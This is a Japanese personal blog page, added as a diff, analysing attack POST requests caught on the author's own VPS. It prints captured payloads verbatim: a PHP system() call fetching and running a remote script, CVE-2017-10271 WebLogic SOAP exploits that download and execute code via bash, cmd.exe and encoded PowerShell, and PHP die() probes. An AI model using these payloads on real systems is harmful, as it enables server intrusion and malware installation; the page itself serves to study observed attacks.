@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="pandoc">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Fri Aug 10 2018</title>
+  <style type="text/css">code{white-space: pre;}</style>
+  <style type="text/css">
+div.sourceCode { overflow-x: auto; }
+table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode {
+  margin: 0; padding: 0; vertical-align: baseline; border: none; }
+table.sourceCode { width: 100%; line-height: 100%; }
+td.lineNumbers { text-align: right; padding-right: 4px; padding-left: 4px; color: #aaaaaa; border-right: 1px solid #aaaaaa; }
+td.sourceCode { padding-left: 5px; }
+code > span.kw { color: #007020; font-weight: bold; } /* Keyword */
+code > span.dt { color: #902000; } /* DataType */
+code > span.dv { color: #40a070; } /* DecVal */
+code > span.bn { color: #40a070; } /* BaseN */
+code > span.fl { color: #40a070; } /* Float */
+code > span.ch { color: #4070a0; } /* Char */
+code > span.st { color: #4070a0; } /* String */
+code > span.co { color: #60a0b0; font-style: italic; } /* Comment */
+code > span.ot { color: #007020; } /* Other */
+code > span.al { color: #ff0000; font-weight: bold; } /* Alert */
+code > span.fu { color: #06287e; } /* Function */
+code > span.er { color: #ff0000; font-weight: bold; } /* Error */
+code > span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+code > span.cn { color: #880000; } /* Constant */
+code > span.sc { color: #4070a0; } /* SpecialChar */
+code > span.vs { color: #4070a0; } /* VerbatimString */
+code > span.ss { color: #bb6688; } /* SpecialString */
+code > span.im { } /* Import */
+code > span.va { color: #19177c; } /* Variable */
+code > span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+code > span.op { color: #666666; } /* Operator */
+code > span.bu { } /* BuiltIn */
+code > span.ex { } /* Extension */
+code > span.pp { color: #bc7a00; } /* Preprocessor */
+code > span.at { color: #7d9029; } /* Attribute */
+code > span.do { color: #ba2121; font-style: italic; } /* Documentation */
+code > span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+code > span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+code > span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+  </style>
+  <link rel="stylesheet" href="../../../resources/css/c.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<a href="../../">🔙 Back to Top</a>
+<header>
+<h1 class="title">Fri Aug 10 2018</h1>
+</header>
+<h2 id="実際に来た攻撃">実際に来た攻撃</h2>
+<p>さくらVPSを借りて自分一人が使うためのサーバマシンとして利用している. その中で http POST されたデータを全て保存するということをひたすらやっていた. 主にはそれを自分用の記録として利用するためだったが、面白いので攻撃的な送信データも敢えて消さず残しておいた.</p>
+<h3 id="ログ">ログ</h3>
+<p>ログそのまんま (自分自身からではないPOSTデータ) を置いておきます. 実行するとダメなコード片が含まれます.</p>
+<ul>
+<li><a href="10.log">ログ (276K)</a></li>
+</ul>
+<h3 id="典型">典型</h3>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?</span>
+<span class="fu">system</span><span class="ot">(</span><span class="st">&quot;cd /tmp ;rm -rf msr*;rm -rf live*;</span>
+<span class="st">wget -c -q  http://95.110.227.132/ch/wp-admin/js/a/msr;perl msr;rm -rf msr ;</span>
+<span class="st">curl -O  http://95.110.227.132/ch/wp-admin/js/a/msr;perl msr;rm -rf msr;</span>
+<span class="st">fetch  http://95.110.227.132/ch/wp-admin/js/a/msr;perl msr;rm -rf msr &quot;</span><span class="ot">);</span>
+<span class="kw">?&gt;</span></code></pre></div>
+<p>改行は勝手に補った.</p>
+<p>phpとして解釈するのだろうか? (<code>&lt;?php</code> で始まってないけど.) 中身は、スクリプトをダウンロードして実行するだけ.</p>
+<p>スクリプトはというと、PCの情報っぽいものをひたすらかき集めて、最後に <code>mail florindoringiga@gmail.com -s &quot;Miron Coszma&quot; &lt; mail</code> するというもの. よく見ると、このスクリプト <code>msr</code> はどう見てもシェルスクリプトだし <code>#!/bin/bash</code> まで付いてるが、なぜ <code>perl</code> で実行してるんだろう.</p>
+<h3 id="典型2">典型2</h3>
+<pre><code>POST /wls-wsat/CoordinatorPortType</code></pre>
+<div class="sourceCode"><pre class="sourceCode xml"><code class="sourceCode xml"><span class="kw">&lt;soapenv:Envelope</span><span class="ot"> xmlns:soapenv=</span><span class="st">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><span class="kw">&gt;</span>
+<span class="kw">&lt;soapenv:Header&gt;</span>
+<span class="kw">&lt;work:WorkContext</span><span class="ot"> xmlns:work=</span><span class="st">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span><span class="kw">&gt;</span>
+<span class="kw">&lt;java</span><span class="ot"> version=</span><span class="st">&quot;1.8.0_131&quot;</span><span class="ot"> class=</span><span class="st">&quot;java.beans.XMLDecoder&quot;</span><span class="kw">&gt;</span>
+<span class="kw">&lt;void</span><span class="ot"> class=</span><span class="st">&quot;java.lang.ProcessBuilder&quot;</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;array</span><span class="ot"> class=</span><span class="st">&quot;java.lang.String&quot;</span><span class="ot"> length=</span><span class="st">&quot;3&quot;</span><span class="kw">&gt;</span>
+    <span class="kw">&lt;void</span><span class="ot"> index=</span><span class="st">&quot;0&quot;</span><span class="kw">&gt;</span>
+      <span class="kw">&lt;string&gt;</span>cmd.exe<span class="kw">&lt;/string&gt;</span>
+    <span class="kw">&lt;/void&gt;</span>
+    <span class="kw">&lt;void</span><span class="ot"> index=</span><span class="st">&quot;1&quot;</span><span class="kw">&gt;</span>
+      <span class="kw">&lt;string&gt;</span>/c<span class="kw">&lt;/string&gt;</span>
+    <span class="kw">&lt;/void&gt;</span>
+    <span class="kw">&lt;void</span><span class="ot"> index=</span><span class="st">&quot;2&quot;</span><span class="kw">&gt;</span>
+      <span class="kw">&lt;string&gt;</span>Start /Min PowerShell.exe -NoP -NonI -EP ByPass -W Hidden -E JABPAFMAPQAoAEcAVwBtAGkAIABXAGkAbgAzADIAXwBPAHAAZQByAGEAdABpAG4AZwBTAHkAcwB0AGUAbQApAC4AQwBhAHAAdABpAG8AbgA7ACQAVwBDAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAFcAQwAuAEgAZQBhAGQAZQByAHMAWwAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwBdAD0AIgBQAG8AdwBlAHIAUwBoAGUAbABsAC8AVwBMACAAJABPAFMAIgA7AEkARQBYACAAJABXAEMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADAALgAyADUALgAxADQAOAAuADIAMAAyAC8AaQBtAGEAZwBlAHMALwB0AGUAcwB0AC8ARABMAC4AcABoAHAAJwApADsA<span class="kw">&lt;/string&gt;</span>
+    <span class="kw">&lt;/void&gt;</span>
+  <span class="kw">&lt;/array&gt;</span>
+    <span class="kw">&lt;void</span><span class="ot"> method=</span><span class="st">&quot;start&quot;</span><span class="kw">/&gt;</span>
+<span class="kw">&lt;/void&gt;</span>
+<span class="kw">&lt;/java&gt;</span>
+<span class="kw">&lt;/work:WorkContext&gt;</span>
+<span class="kw">&lt;/soapenv:Header&gt;</span>
+<span class="kw">&lt;soapenv:Body/&gt;</span>
+<span class="kw">&lt;/soapenv:Envelope&gt;</span></code></pre></div>
+<p>POST先の &quot;/wls-wsat/CoordinatorPortType&quot; でぐぐったら、これが何か分かった. <a href="https://www.ipa.go.jp/security/ciadr/vul/20180115_WebLogicServer.html">CVE-2017-10271</a> であるらしい.</p>
+<p>このSOAPの意味は正しくは分からないけれど、雰囲気、</p>
+<pre><code>cmd.exe /c &quot;Start /Min....&quot;</code></pre>
+<p>を実行するもので、明らかにWindows環境のそれっぽい. <code>/c</code> オプションは、続く文字列をコマンドとしてただ実行するもの. データの中にある <code>-E JABP...</code> であるが、これは base64 でデコードすると</p>
+<pre><code>$OS=(GWmi Win32_OperatingSystem).Caption;$WC=New-Object Net.WebClient;$WC.Headers[&#39;User-Agent&#39;]=&quot;PowerShell/WL $OS&quot;;IEX $WC.DownloadString(&#39;http://120.25.148.202/images/test/DL.php&#39;);</code></pre>
+<p>と出た. <code>DL.php</code> というスクリプトをダウンロードするだけのPowerShell上で動くコードっぽい. 実行したあとどこで動かすのかよく分からないけど.</p>
+<p>このURLは今は繋がらないものになっていて、IPだけが変えられたデータが送られてきてたので、一瞬だけサーバを立ち上げて攻撃してサーバを閉じて、というのを繰り返してるらしい.</p>
+<h4 id="他バリエーション">他バリエーション</h4>
+<p>実行するコマンドがちょっと違うだけ.</p>
+<div class="sourceCode"><pre class="sourceCode xml"><code class="sourceCode xml"><span class="kw">&lt;soapenv:Envelope</span><span class="ot"> xmlns:soapenv=</span><span class="st">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;soapenv:Header&gt;</span>
+    <span class="kw">&lt;work:WorkContext</span><span class="ot"> xmlns:work=</span><span class="st">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span><span class="kw">&gt;</span>
+      <span class="kw">&lt;java</span><span class="ot"> version=</span><span class="st">&quot;1.8.0_151&quot;</span><span class="ot"> class=</span><span class="st">&quot;java.beans.XMLDecoder&quot;</span><span class="kw">&gt;</span>
+        <span class="kw">&lt;void</span><span class="ot"> class=</span><span class="st">&quot;java.lang.ProcessBuilder&quot;</span><span class="kw">&gt;</span>
+          <span class="kw">&lt;array</span><span class="ot"> class=</span><span class="st">&quot;java.lang.String&quot;</span><span class="ot"> length=</span><span class="st">&quot;3&quot;</span><span class="kw">&gt;</span>
+            <span class="kw">&lt;void</span><span class="ot"> index=</span><span class="st">&quot;0&quot;</span><span class="kw">&gt;</span>
+              <span class="kw">&lt;string&gt;</span>/bin/bash<span class="kw">&lt;/string&gt;</span>
+            <span class="kw">&lt;/void&gt;</span>
+            <span class="kw">&lt;void</span><span class="ot"> index=</span><span class="st">&quot;1&quot;</span><span class="kw">&gt;</span>
+              <span class="kw">&lt;string&gt;</span>
+                -c<span class="kw">&lt;/string&gt;</span>
+            <span class="kw">&lt;/void&gt;</span>
+            <span class="kw">&lt;void</span><span class="ot"> index=</span><span class="st">&quot;2&quot;</span><span class="kw">&gt;</span>
+              <span class="kw">&lt;string&gt;</span>
+                wget -O - http://185.117.75.219/jquery.js | bash<span class="kw">&lt;/string&gt;</span>
+            <span class="kw">&lt;/void&gt;</span>
+          <span class="kw">&lt;/array&gt;</span>
+          <span class="kw">&lt;void</span><span class="ot"> method=</span><span class="st">&quot;start&quot;</span> <span class="kw">/&gt;</span>
+        <span class="kw">&lt;/void&gt;</span>
+      <span class="kw">&lt;/java&gt;</span>
+    <span class="kw">&lt;/work:WorkContext&gt;</span>
+  <span class="kw">&lt;/soapenv:Header&gt;</span>
+  <span class="kw">&lt;soapenv:Body</span> <span class="kw">/&gt;</span>
+<span class="kw">&lt;/soapenv:Envelope&gt;</span></code></pre></div>
+<div class="sourceCode"><pre class="sourceCode xml"><code class="sourceCode xml"><span class="kw">&lt;soapenv:Envelope</span><span class="ot"> xmlns:soapenv=</span><span class="st">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;soapenv:Header&gt;</span>
+    <span class="kw">&lt;work:WorkContext</span><span class="ot"> xmlns:work=</span><span class="st">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span><span class="kw">&gt;</span>
+      <span class="kw">&lt;java&gt;</span>
+        <span class="kw">&lt;void</span><span class="ot"> class=</span><span class="st">&quot;java.lang.ProcessBuilder&quot;</span><span class="kw">&gt;</span>
+          <span class="kw">&lt;array</span><span class="ot"> class=</span><span class="st">&quot;java.lang.String&quot;</span><span class="ot"> length=</span><span class="st">&quot;3&quot;</span><span class="kw">&gt;</span>
+            <span class="kw">&lt;void</span><span class="ot"> index=</span><span class="st">&quot;0&quot;</span><span class="kw">&gt;</span>
+              <span class="kw">&lt;string&gt;</span>
+                \windows\system32\cmd.exe<span class="kw">&lt;/string&gt;</span>
+            <span class="kw">&lt;/void&gt;</span>
+            <span class="kw">&lt;void</span><span class="ot"> index=</span><span class="st">&quot;1&quot;</span><span class="kw">&gt;</span>
+              <span class="kw">&lt;string&gt;</span>
+              <span class="kw">&lt;/string&gt;</span>
+            <span class="kw">&lt;/void&gt;</span>
+            <span class="kw">&lt;void</span><span class="ot"> index=</span><span class="st">&quot;2&quot;</span><span class="kw">&gt;</span>
+              <span class="kw">&lt;string&gt;</span>
+                wershell.exe -WindowStyle Hidden $P = nEW-oBJECT sYSTEM.nET.wEBcLIENT;$P.DownloadFile(&#39;http://bbc.servehalflife.com/loveby.exe&#39;, &#39;C:\Windows\team.exe&#39;);START C:\Windows\team.exe<span class="kw">&lt;/string&gt;</span>
+            <span class="kw">&lt;/void&gt;</span>
+          <span class="kw">&lt;/array&gt;</span>
+          <span class="kw">&lt;void</span><span class="ot"> method=</span><span class="st">&quot;start&quot;</span><span class="kw">/&gt;</span>
+        <span class="kw">&lt;/void&gt;</span>
+      <span class="kw">&lt;/java&gt;</span>
+    <span class="kw">&lt;/work:WorkContext&gt;</span>
+  <span class="kw">&lt;/soapenv:Header&gt;</span>
+  <span class="kw">&lt;soapenv:Body/&gt;</span>
+<span class="kw">&lt;/soapenv:Envelope&gt;</span></code></pre></div>
+<h3 id="die-系-こんにちわ-peppa">die 系 (こんにちわ Peppa!)</h3>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php">h=<span class="fu">die</span><span class="ot">(</span><span class="st">&#39;Hello, Peppa!&#39;</span><span class="ot">);</span></code></pre></div>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php">h=<span class="fu">die</span><span class="ot">(</span><span class="st">&#39;Hello, Peppa!&#39;</span>.<span class="dt">(string)</span><span class="ot">(</span><span class="dv">111111111</span>*<span class="dv">9</span><span class="ot">));</span></code></pre></div>
+<p>2018年6月から急に現れたタイプで、短期間に集中的にアクセスが来る. リクエスト先 (決まって <code>/*.php</code> という形のもの) やコードの中身がちょっとずつ変化しながらアクセスがあるので、手動で実験的にスクリプトを動かしたりしてるのではないだろうか. 中身はこのようなほとんど意味のない、<code>die</code> を呼ぶだけのもの. <code>die</code> に引数渡すと、それを出力して終了するらしい. 凝った引数を渡す意味はよくわからない. 単に、送信したデータが動いていることを確認する意味だろう.</p>
+<p>ちなみに Peppa でググると &quot;Peppa Pig&quot; という海外のテレビ番組のキャラクターが出てくる. &quot;Hello, Peppa!&quot; という文字列も何か元ネタがあるのだろうか. ぐぐっても「こんな変なアクセスがあった」という記事くらいしかヒットしない.</p>
+<p>こういった攻撃的なアクセスにも流行性があるのが面白い.</p>
+<footer>
+    <p class="is-pulled-right">
+    @cympfh / cympfh@gmail.com
+    </p>
+</footer>
+<!--
+
+  HTML として pandoc -B で include する.
+
+  <H2> を列挙してそれらにリンクを貼った toc を id='toc' に埋め込む.
+  markdown で書いてるだろうから例として次のような段落を書けばよい.
+
+```
+## INDEX
+<div id=toc></div>
+```
+
+  used in
+  - /memo/gnuplot
+  - /memo/linux
+  - /memo/imagemagick
+
+-->
+<script>
+(function() {
+  var sections = document.getElementsByTagName('h2');
+  var i;
+  var OL = document.createElement('ol');
+  for (i=0; i < sections.length; ++i) {
+    var LI = document.createElement('li');
+    var A = document.createElement('a');
+    A.innerHTML = sections[i].innerHTML;
+    if (A.innerHTML.toUpperCase() == 'INDEX') continue;
+    A.href = '#' + i;
+    LI.appendChild(A);
+    OL.appendChild(LI);
+
+    var PREF = document.createElement('a');
+    PREF.name = i;
+    sections[i].appendChild(PREF);
+  }
+
+  var done = false;
+  function work() {
+    if (done) return;
+    if ( document.getElementById('toc') === null) return; // no toc element
+    document.getElementById('toc').appendChild(OL);
+    done = true;
+  };
+
+  window.onload = work;
+  setTimeout(work,800);
+}());
+</script>
+</body>
+</html>
